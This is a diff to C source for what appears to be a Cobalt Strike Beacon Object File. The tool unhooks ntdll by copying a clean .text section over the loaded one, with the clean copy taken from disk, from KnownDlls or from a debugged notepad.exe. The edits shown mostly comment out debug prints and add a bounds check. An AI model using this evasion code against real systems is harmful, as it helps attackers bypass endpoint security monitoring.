@@ -298,7 +298,7 @@ void* GetModuleAddr() {
 int* GetTextSectionInfo(LPVOID ntdll_address) {
     SIZE_T bytesRead;
     HANDLE hProcess = (HANDLE) -1;
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);
 
     // Read e_lfanew (4 bytes) at offset 0x3C
     DWORD e_lfanew;
@@ -504,23 +504,23 @@ void ReplaceLibrary(const char* option){
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: disk\n");
         const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
         unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
         unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
     }
     else if (MyStrCmp(option, "knowndlls") == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: knowndlls\n");
         unhookedNtdllHandle = MapNtdllFromKnownDlls();
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
         unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
 
     }
     else if (MyStrCmp(option, "debugproc") == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: debugproc\n");
         const char* proc_path = "c:\\Windows\\System32\\notepad.exe";     
         unhookedNtdllTxt = MapNtdllFromDebugProc(proc_path);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
     }
     else{
         return;
@@ -533,8 +533,8 @@ void ReplaceLibrary(const char* option){
     int localNtdllTxtSize = textSectionInfo[1];
     long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
 
     ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
@@ -996,7 +996,10 @@ void Shock(char* filename, HANDLE* hProcessOutput){
                 aux_module.size = aux_size;
                 // Find module index
                 int aux_index = find_index_by_name(module_list, module_counter, aux_name);
-                module_list[aux_index] = aux_module;
+                // BeaconPrintf(CALLBACK_OUTPUT, "[+] aux_index: \t\t%d\n", aux_index);
+                if (aux_index >= 0 && aux_index < module_counter){
+                    module_list[aux_index] = aux_module;
+                }
 
                 for (int k = 0; k < module_counter; k++) {
                     if (mbi.BaseAddress == module_list[k].dll_base) {                        
